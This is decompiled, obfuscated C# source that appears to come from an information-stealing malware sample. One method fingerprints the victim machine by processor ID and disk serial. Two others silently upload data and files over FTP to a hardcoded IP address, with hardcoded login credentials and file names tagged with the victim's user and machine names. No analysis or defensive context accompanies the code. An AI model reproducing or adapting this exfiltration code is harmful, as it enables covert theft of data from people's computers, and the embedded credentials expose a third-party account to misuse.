using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;

namespace NebZuOsqGKsBdvX;

internal sealed class QRoenrHGXDNnO
{
	public static string JPKfduNvMCGtJ()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass("win32_processor");
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = "C";
		ManagementObject val3 = new ManagementObject("win32_logicaldisk.deviceid=\"" + text2 + ":\"");
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item("VolumeSerialNumber").ToString();
		return text3 + text;
	}

	public static void QrZeevPGqnoYtm(string vQZnLxHKNw = "ftp://199.188.200.253/public_html/newshit/", string rkJIpUfNTHz = "9b732058@noether-stiftung.de", string tzGybOFfFRuMGU = "13MelisaLening37", string sVEWLPYHfGD = "")
	{
		try
		{
			string text = JPKfduNvMCGtJ();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(vQZnLxHKNw + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + ".txt");
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(rkJIpUfNTHz, tzGybOFfFRuMGU);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(sVEWLPYHfGD);
			ftpWebRequest.ContentLength = bytes.Length;
			using (Stream stream = ftpWebRequest.GetRequestStream())
			{
				stream.Write(bytes, 0, bytes.Length);
			}
			using ((FtpWebResponse)ftpWebRequest.GetResponse())
			{
			}
		}
		catch
		{
		}
	}

	public static void HxZkhrcbXYNYY(string WLPsvBUBlVKMR = "ftp://199.188.200.253/public_html/newshit/", string WZAKdUeYeyx = "9b732058@noether-stiftung.de", string dOuPQedgBAVip = "13MelisaLening37", string BnFzXZynKQnP = "")
	{
		try
		{
			using WebClient webClient = new WebClient();
			webClient.Credentials = new NetworkCredential(WZAKdUeYeyx, dOuPQedgBAVip);
			webClient.UploadFile(WLPsvBUBlVKMR + string.Format("UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + Path.GetFileName(BnFzXZynKQnP)), "STOR", BnFzXZynKQnP);
		}
		catch
		{
		}
	}
}
